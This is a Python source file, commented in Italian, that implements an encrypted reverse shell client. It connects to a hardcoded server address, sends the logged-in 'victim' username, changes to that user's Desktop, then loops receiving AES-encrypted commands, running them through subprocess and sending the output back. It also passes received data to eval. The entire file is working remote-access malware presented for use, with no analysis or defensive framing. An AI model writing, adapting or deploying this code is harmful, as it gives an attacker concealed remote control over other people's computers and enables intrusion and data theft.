import socket
import os
import subprocess
from Crypto.Cipher import AES

key = b's1cur3zz4pr1v4cy' # chiave crittografica

#algoritmi per crittografare e decrittografare i messaggi

def encrypt_msg(msg):
    cipher = AES.new(key, AES.MODE_EAX)
    nonce = cipher.nonce
    ciphertext = cipher.encrypt(msg.encode())
    c_msg = []
    c_msg.append(ciphertext)
    c_msg.append(nonce)
    return str(c_msg).encode('utf-8')
    
def decrypt_msg(msg):
    msg_pack = eval(msg.decode('utf-8'))
    nonce = msg_pack[1]
    cipher = AES.new(key, AES.MODE_EAX, nonce)    
    d_msg = cipher.decrypt(msg_pack[0])
    return d_msg.decode()

SERVER_HOST = '192.168.1.53' # indirizzo IP del server 
SERVER_PORT = 5555 # porta usata per la comunicazione con la reverse shell
BUFFER_SIZE = 1024 * 128 
SEPARATOR = "<sep>"
# creo il socket
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.connect((SERVER_HOST, SERVER_PORT))
# mi collego e invio lo username della vittima al server
username = os.getlogin()
s.send(encrypt_msg(username))
# mi sposto sul desktop
os.chdir(f"C:\\Users\{username}\Desktop")

while True:
    # ricevo il comando dal server
    command = decrypt_msg(s.recv(BUFFER_SIZE))
    splitted_command = command.split()
    if command.lower() == "exit":
        # se il comando è exit chiudo la connessione
        break
    if splitted_command[0].lower() == "cd":
        # cambio della directory se richiesto
        try:
            os.chdir(' '.join(splitted_command[1:]))
        except Exception as e:
            output = str(e)
        else:
            output = ""
    else:
        # altrimenti eseguo il comando e ritorno l'output della shell
        output = subprocess.getoutput(command)
    cwd = os.getcwd()
    # invio l'output crittografato al server
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(encrypt_msg(message))
s.close()
